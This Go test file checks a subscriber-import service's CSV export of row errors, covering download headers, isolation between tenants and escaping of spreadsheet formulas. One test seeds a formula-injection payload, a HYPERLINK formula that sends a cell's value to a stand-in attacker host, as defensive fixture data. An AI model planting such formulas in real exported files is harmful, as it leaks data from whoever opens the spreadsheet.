// SPDX-License-Identifier: AGPL-3.0-only

package subscriber_import

import (
	"context"
	"encoding/csv"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/postwave/postwave/apps/api/internal/db"
)

// The failures have to come back in the format the fix happens in.
//
// A user imports 10,000 contacts and is told 42 rows failed. The JSON list
// answers "which ones" for a program; it does not answer it for the person who
// has to open their spreadsheet, find those rows, and correct them. That is a
// CSV job, and the row asked for one.
//
// The same tenant scoping and the same query — a second endpoint with its own
// SQL would be a second place for the isolation predicate to be wrong.

func TestRowErrorsCSVIsTheSameDataInASpreadsheetShape(t *testing.T) {
	pool := newImportErrorsPool(t)
	tenantID, importID := seedImportWithErrors(t, pool, 3)

	rec := httptest.NewRecorder()
	req := csvRequest(t, tenantID, importID)
	(&Deps{Pool: pool}).RowErrors(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rec.Code, rec.Body.String())
	}
	if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Fatalf("Content-Type=%q, want text/csv — a browser must download this, "+
			"not render it", ct)
	}
	if cd := rec.Header().Get("Content-Disposition"); !strings.Contains(cd, "attachment") {
		t.Fatalf("Content-Disposition=%q, want an attachment", cd)
	}
	if rec.Header().Get("Cache-Control") != "no-store" {
		t.Fatalf("Cache-Control=%q, want no-store", rec.Header().Get("Cache-Control"))
	}
	if rec.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("X-Content-Type-Options=%q, want nosniff",
			rec.Header().Get("X-Content-Type-Options"))
	}

	records, err := csv.NewReader(strings.NewReader(rec.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("response is not valid CSV: %v", err)
	}
	if len(records) != 4 {
		t.Fatalf("got %d CSV lines, want a header plus 3 rows", len(records))
	}
	if records[0][0] != "row_number" {
		t.Fatalf("header=%v, want row_number first — it is the column someone "+
			"sorts their spreadsheet by", records[0])
	}
}

func TestCSVDoesNotLeakAnotherWorkspacesFailures(t *testing.T) {
	// The same isolation the JSON path enforces. A second endpoint with its own
	// SQL is a second place for this predicate to be wrong, which is why both
	// formats run one query.
	pool := newImportErrorsPool(t)
	_, importID := seedImportWithErrors(t, pool, 2)
	otherTenant, _ := seedImportWithErrors(t, pool, 1)

	rec := httptest.NewRecorder()
	(&Deps{Pool: pool}).RowErrors(rec, csvRequest(t, otherTenant, importID))

	if rec.Code != http.StatusNotFound {
		t.Fatalf("status=%d body=%s, want the same 404 as a nonexistent import",
			rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "import_not_found") ||
		strings.Contains(rec.Body.String(), "malformed_row") {
		t.Fatalf("cross-tenant CSV response is unsafe: %s", rec.Body.String())
	}
	if rec.Header().Get("Cache-Control") != "no-store" {
		t.Fatalf("Cache-Control=%q, want no-store", rec.Header().Get("Cache-Control"))
	}
}

func TestCSVNeutralisesFormulaInjection(t *testing.T) {
	// An error message beginning `=`, `+`, `-` or `@` is executed as a formula
	// when the file is opened. The message is attacker-influenced: it can carry
	// a value from the uploaded row. A CSV export of user data that Excel runs
	// is the classic version of this.
	pool := newImportErrorsPool(t)
	tenantID, importID := seedImportWithErrorMessage(t, pool,
		`=HYPERLINK("http://evil.test?x="&A1,"click")`)

	rec := httptest.NewRecorder()
	(&Deps{Pool: pool}).RowErrors(rec, csvRequest(t, tenantID, importID))

	// Assert on the PARSED cell, not the raw bytes. Go's csv.Writer quotes any
	// field containing a comma or a quote, so `,"=HYPERLINK(...` appears in the
	// body either way — a substring check over the raw response passes whether
	// or not the value was escaped, which is how the first version of this test
	// stayed green against an unescaped formula.
	records, err := csv.NewReader(strings.NewReader(rec.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("not valid CSV: %v", err)
	}
	if len(records) < 2 {
		t.Fatalf("no data row: %v", records)
	}
	cell := records[1][2]
	if strings.HasPrefix(cell, "=") {
		t.Fatalf("the error cell is still a live formula: %q", cell)
	}
	if !strings.Contains(cell, "HYPERLINK") {
		t.Fatalf("the original text was lost: %q. The operator still needs to "+
			"see what was in the row to fix it", cell)
	}
}

// csvRequest is importErrorsRequest with the format switch. Kept beside the
// CSV tests so the JSON helper stays unchanged for its own callers.
func csvRequest(t *testing.T, tenantID, importID string) *http.Request {
	t.Helper()
	req := importErrorsRequest(t, tenantID, importID)
	q := req.URL.Query()
	q.Set("format", "csv")
	req.URL.RawQuery = q.Encode()
	return req
}

// seedImportWithErrorMessage seeds one failure carrying an exact message, so a
// formula-injection case can assert on the bytes that reach the file.
func seedImportWithErrorMessage(t *testing.T, pool *db.Pool, message string) (string, string) {
	t.Helper()
	tenantID, importID := seedImportWithErrors(t, pool, 1)
	ctx := context.Background()
	tx, err := db.WithTenant(ctx, pool, tenantID)
	if err != nil {
		t.Fatalf("tenant tx: %v", err)
	}
	defer func() { _ = tx.Rollback(ctx) }()
	if _, err := tx.Exec(ctx, `
UPDATE subscriber_import_errors SET error = $2
 WHERE tenant_id = $1::uuid`, tenantID, message); err != nil {
		t.Fatalf("set error message: %v", err)
	}
	if err := tx.Commit(ctx); err != nil {
		t.Fatal(err)
	}
	return tenantID, importID
}
